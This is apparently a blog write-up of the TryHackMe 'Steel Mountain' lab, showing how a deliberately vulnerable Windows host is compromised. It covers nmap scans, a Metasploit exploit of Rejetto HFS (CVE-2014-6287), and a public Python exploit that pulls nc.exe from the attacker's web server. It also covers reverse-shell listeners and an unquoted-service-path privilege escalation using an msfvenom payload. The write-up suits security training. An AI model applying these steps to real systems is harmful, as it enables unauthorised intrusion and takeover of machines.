---
title: Steel Mountain
categories: [TryHackMe, WriteUp]
tags: [Steel Mountain, TryHackMe, WriteUp]
---

# Steel Mountain
![img-description](/assets/img/posts/steel-mountain/steel-mountain.jpg)

>In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.

Ok, so we start with the enumeration of the machine.


### <span style="color:blue">[Task 1] - Introduction</span>

#### 1. Deploy the machine. Who is the employee of the month?

We enumerate by using **nmap**. I, usually, start with a light scan (top 10 ports TCP), just far having a rapid result. Than, I execute a full port TCP and, finally, a vuln scan.
I forgot always the UDP ports :confused: but, if I could do it, I should do the top 100 UDP.

So, the light scan TCP of nmap, give us the following result:
```
└─$ sudo nmap 10.10.26.74 --top-ports=10 --reason --open -sV -sT -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 09:41 EDT
Nmap scan report for 10.10.17.123
Host is up, received user-set (0.043s latency).
Not shown: 6 closed ports
Reason: 6 conn-refused
PORT     STATE SERVICE            REASON  VERSION
80/tcp   open  http               syn-ack Microsoft IIS httpd 8.5
139/tcp  open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ssl/ms-wbt-server? syn-ack
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.68 seconds
```


We have a **Microsoft Windows Server 2008 R2 - 2012 microsoft-ds**. So a Windows machine, as the challenge description said.

Now, the full port TCP:
```
└─$ sudo nmap 10.10.26.74 -p- -O -sS -sV --reason --open                                                                                                                                                                      130 ⨯

Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 09:43 EDT
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 95.16% done; ETC: 09:44 (0:00:01 remaining)
Nmap scan report for 10.10.17.123
Host is up, received echo-reply ttl 127 (0.044s latency).
Not shown: 65520 closed ports
Reason: 65520 resets
PORT      STATE SERVICE            REASON          VERSION
80/tcp    open  http               syn-ack ttl 127 Microsoft IIS httpd 8.5
135/tcp   open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn        syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server? syn-ack ttl 127
5985/tcp  open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  open  http               syn-ack ttl 127 HttpFileServer httpd 2.3
47001/tcp open  http               syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49163/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
49164/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=3/25%OT=80%CT=1%CU=42141%PV=Y%DS=2%DC=I%G=Y%TM=605C93F
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M505NW8ST11%O2=M505NW8ST11%O3=M505NW8NNT11%O4=M505NW8ST11%O5=M5
OS:05NW8ST11%O6=M505ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M505NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 99.84 seconds
```

Wow, much information for us! We note, especially, the 8080 port with the service **HttpFileServer httpd 2.3**, this can be promising. We will remember of it ;)

By continuing our enumeration, we execute a vulnerabilities scan:
```
└─$ sudo nmap --script vuln 10.10.26.74
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-25 09:47 EDT
Stats: 0:04:44 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.91% done; ETC: 09:51 (0:00:00 remaining)
Nmap scan report for 10.10.17.123
Host is up (0.048s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE
80/tcp    open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-vuln-cve2015-1635: 
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
|       successfully exploited this vulnerability could execute arbitrary code in the context of the System account.
|           
|     Disclosure date: 2015-04-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_AES_256_GCM_SHA384
|             Modulus Type: Safe prime
|             Modulus Source: RFC2409/Oakley Group 2
|             Modulus Length: 1024
|             Generator Length: 1024
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
|_sslv2-drown: 
8080/tcp  open  http-proxy
| http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     /~login [GENERIC]
|   
|     References:
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|       http://www.mkit.com.ar/labs/htexploit/
|       http://capec.mitre.org/data/definitions/274.html
|_      https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
| http-vuln-cve2011-3192: 
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  CVE:CVE-2011-3192  BID:49303
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       https://www.tenable.com/plugins/nessus/55976
|       https://www.securityfocus.com/bid/49303
|       https://seclists.org/fulldisclosure/2011/Aug/175
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  unknown
49163/tcp open  unknown

Host script results:
|_samba-vuln-cve-2012-1182: No accounts left to try
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: No accounts left to try

Nmap done: 1 IP address (1 host up) scanned in 315.01 seconds
```

This is a long output, but we note an interesting vulnerability:
```
8080/tcp  open  http-proxy
| http-method-tamper: 
|   VULNERABLE:
|   Authentication bypass by HTTP verb tampering
|     State: VULNERABLE (Exploitable)
|       This web server contains password protected resources vulnerable to authentication bypass
|       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
|        common HTTP methods and in misconfigured .htaccess files.
|              
|     Extra information:
|       
|   URIs suspected to be vulnerable to HTTP verb tampering:
|     /~login [GENERIC]
|   
|     References:
|       http://www.imperva.com/resources/glossary/http_verb_tampering.html
|       http://www.mkit.com.ar/labs/htexploit/
|       http://capec.mitre.org/data/definitions/274.html
|_      https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
```

This is of the interesting service mention before.
Also, the port 80 has something interesting:
```
80/tcp    open  http
[...]
| http-vuln-cve2015-1635: 
|   VULNERABLE:
|   Remote Code Execution in HTTP.sys (MS15-034)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-1635
|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
|       successfully exploited this vulnerability could execute arbitrary code in the context of the System account.
|           
|     Disclosure date: 2015-04-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
```


Before to procede with the founded vulnerabilities, we continue our enumeration. We want to see what's in the web app and we navigate the port 80.

In the port 80:
![Web app Port 80](/assets/img/posts/steel-mountain/port80.png)

This can be helpfull to responde to the first question of the challenge. Indeed, by viewing the source code we retrieve the employee name:
![Employee Name](/assets/img/posts/steel-mountain/employee_name.png)

So, the name is **Bill Harper**.


### <span style="color:blue">[Task 2] - Initial Access</span>


Now you have deployed the machine, lets get an initial shell!

#### 1. Scan the machine with nmap. What is the other port running a web server on?

Oh, to this question we know responde. We saw first in the nmap that we have the port 8080.


#### 2. Take a look at the other web server. What file server is running?

We access website:
![Web app Port 8080](/assets/img/posts/steel-mountain/port8080.png)

And we remeber that we have the **HttpFileServer httpd 2.3**. Futhermore, by clicking the name of service, we obtain the software page:
![Rejetto Page](/assets/img/posts/steel-mountain/rejetto_page.png)

So, the answer is **Rejetto HTTP File Server**.


#### 3. What is the CVE number to exploit this file server?


By searching,on exploitdb, this software we get that has some known vulnerabilities:
![Rejetto Vulnerabiilies](/assets/img/posts/steel-mountain/rejetto_vuln.png)

And we have some Remote Command Execution! We get the first result and we see that the version is the same of our web server:
![Rejetto Remote Comand Execution](/assets/img/posts/steel-mountain/rejetto_command_execution.png)

So, the answer is **2014-6287**.


#### 4. Use Metasploit to get an initial shell. What is the user flag?

We start Metasploit.
```
msfconsole
```

And we search the CVE 2014-6287:
![CVE 2014-6287](/assets/img/posts/steel-mountain/msf_CVE-2012-6287.png)

We view the options:
![CVE 2014-6287 Exploit Options](/assets/img/posts/steel-mountain/options_exploit.png)

And we set the needed options:
```
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.26.74
RHOSTS => 10.10.17.123
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.8.80.159
LHOST => 10.8.80.159
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
RPORT => 8080
```

And we run and we get a session :D :
![Meterpreter session](/assets/img/posts/steel-mountain/meterpreter_session.png)

After we look around, we found the flag (the file **user.txt**) in the **C:\Users\bill\Desktop**

![Meterpreter Flag User](/assets/img/posts/steel-mountain/msf_flag_user.png)



### <span style="color:blue">[Task 3] - Privilege Escalation</span>

> Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!

To enumerate the machine, we use the powershell script called **PowerUp**, that you can find [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).

#### 1. Upload Script

We need to upload the file and we use the meterpreter session that we get first:
![Metasploit Upload PowerUp](/assets/img/posts/steel-mountain/msf_upload.png)

We check that the script is uploaded:
![Metasploit Uploaded PowerUp](/assets/img/posts/steel-mountain/msf_uploaded.png)

Now, we first start a powershell shell:

![Metasploit Powershell Shell](/assets/img/posts/steel-mountain/msf_powershell.png)

And we run the script (first we load it and than we invoke it):
![Metasploit Powershell Script](/assets/img/posts/steel-mountain/msf_ps_run.png)

#### 2. Take close attention to the CanRestart option that is set to true. What is the name of the name of the service which shows up as an unquoted service path vulnerability?

From the output of the script, we see that the Service Name is **AdvancedSystemCareService9**.

#### 3. The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!

So, we can use the **Unquoted Service Path** vulnerabilty.
For this, we get note of the path of the service:
```
C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
```

Than, we generate a payload for execute a reverse shell with the name **Advanced.exe**:
![Msfvenom payload](/assets/img/posts/steel-mountain/msfvenom.png)


Now, we upload the payload:

![Metasplot upload payload](/assets/img/posts/steel-mountain/msf_upload_payload.png)

And move the payload in the path **C:\Program Files (x86)\IObit\\**:
```
move "C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Advanced.exe" "C:\Program Files (x86)\IObit\"
```
![Metasplot uploaded payload](/assets/img/posts/steel-mountain/msf_uploaded_payload.png)



Before to use the vulnerability, we create a listener:
```
nc -lnvp 1111
```

And we use the vulnerability, by stopping and starting the AdvancedSystemCareService9 service:
![Metasplot uploaded payload](/assets/img/posts/steel-mountain/msf_service_restart.png)


We came back to our listener and we get a shell as **system**:
![Metasplot Privilege Escalation](/assets/img/posts/steel-mountain/msf_privilege_escalation.png)


#### 4. What is the root flag?

We get the root flag in the path **C:\Users\Administrator\Desktop**:
![Metasplot Administrator Flag](/assets/img/posts/steel-mountain/msf_root_flag.png)




### <span style="color:blue">[Task 4] - Access and Escalation Without Metasploit</span>

> Now let's complete the room without the use of Metasploit.
> 
> For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to.


#### 1. Save Script

To resolve the challenge without metasploit we use a [python script](https://github.com/am0nsec/exploit/blob/master/windows/http/RejettoHTTPFileServer-2.3/rejetto_hfs.py) founded by searching **httpfileserver httpd 2.3 exploit github** on Google.

Before to use the script, we must modify some value:
```
ip_addr = "10.8.80.159" #local IP address
local_port = "443" # Local Port number
```

Then, we start a listener:
```
sudo nc -lnvp 443
```

And we copy the **nc.exe** in a folder and we start a python server (**N.B** The python server must start in the same folder in which we copy the tool nc.exe because the script will upload the tool):

```
sudo python -m SimpleHTTPServer 80
```

Finally we start the script:
```
python 39161.py 10.10.26.74 8080
```

and we see that output in the python script:
![Script Upload nc.exe](/assets/img/posts/steel-mountain/upload_nc.png)

and, also, we get the access in the listener:
![Script Access](/assets/img/posts/steel-mountain/script_access.png)

But we are a low-privilege user. 


#### 2. Get WinPEAS

Before download winpeas, We get the architecture of system:
![Systeminfo](/assets/img/posts/steel-mountain/systeminfo.png)

We see that is a x64 architecture.

We copy WinPEAS file in a folder and we start a python server:
```
sudo python -m SimpleHTTPServer 80
```
Then, we download [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) and we upload it in the machine:
![WinPEAS uploaded](/assets/img/posts/steel-mountain/winpeas_uploaded.png)


#### 3. What powershell -c command could we run to manually find out the service name? 
The powershell command to manually listing services is:
```
powershell -c "Get-Service"
```

#### 4. Now let's escalate to Administrator with our new found knowledge 

We run WinPEAS and we note the **Unquoted Service Path** :
![WinPEAS output](/assets/img/posts/steel-mountain/winpeas_output.png)

We generate a payload for execute a reverse shell with the name **Advanced.exe**:
![Msfvenom payload](/assets/img/posts/steel-mountain/msfvenom.png)

We copy the payload file in a folder and we start a python server:
```
sudo python -m SimpleHTTPServer 80
```
And upload the payload in the machine:
![Advanced.exe payload upload](/assets/img/posts/steel-mountain/script_upload_advanced.png)

We move the payload in the path **C:\Program Files (x86)\IObit\\**:
```
move "C:\Users\bill\Desktop\Advanced.exe" "C:\Program Files (x86)\IObit\"
```
![Advanced.exe uploaded](/assets/img/posts/steel-mountain/script_advanced_uploaded.png)

Now, we create the listener:
```
nc -lnvp 1111
```

And we start the AdvancedSystemCareService9 service:
```
net start AdvancedSystemCareService9
```

And we get the system shell:

![System shell](/assets/img/posts/steel-mountain/system_shell.png)